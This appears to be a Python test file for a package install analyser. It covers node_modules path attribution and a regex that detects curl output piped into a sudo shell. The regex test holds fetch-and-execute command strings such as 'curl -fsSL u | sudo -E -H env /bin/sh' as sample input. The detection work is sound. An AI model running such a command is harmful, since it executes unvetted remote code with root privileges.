        ("/app/node_modules/a/lib/node_modules/b", (("a",), "lib/node_modules/b")),
        ("/app/node_modules/node_modules/x", (("node_modules",), "x")),
        ("/app/node_modules/.bin/x", ((), ".bin/x")),
        ("/app/node_modules/@s", ((), "@s")),
        ("/app/node_modules", None),
        ("/app/other/x", None),
    ],
)
def test_module_chain(path: str, chain: tuple[tuple[str, ...], str] | None) -> None:
    assert module_chain(path) == chain


def test_origins_of_paths() -> None:
    activity = analyse(make_run(), (), bundled_deps=BUNDLED)
    assert activity.origin(None) is None
    assert activity.origin("relative/x") is None
    assert activity.origin("/tmp/x") is None
    assert activity.origin(f"{PKG}/node_modules/.bin/x") is None
    assert activity.origin("/app/node_modules/@s") is None
    assert activity.origin(f"{PKG}/lib/../index.js") == "in the package"
    assert activity.origin(f"{DEP}/node_modules/deeper") == "in dependency deeper"
    plain = analyse(make_run(), ())
    assert plain.origin(f"{PKG}/node_modules/own/x") == "in dependency own"
    assert plain.bundled is None and plain.closed_modules


def test_a_sudo_option_chain_stops_at_a_pipe() -> None:
    text = "curl|sudo -" + "curl|sudo -" * 12_000 + "E sh"
    started = time.perf_counter()
    PIPE_RUN.search(text)
    assert time.perf_counter() - started < 1.0
    match = PIPE_RUN.search("curl -fsSL u | sudo -E -H env /bin/sh")
    assert match is not None and match.start("start") == 0
    match = PIPE_RUN.search("curl u|sudo -curl|sudo -E sh")
    assert match is not None and match.start("start") == len("curl u|sudo -")
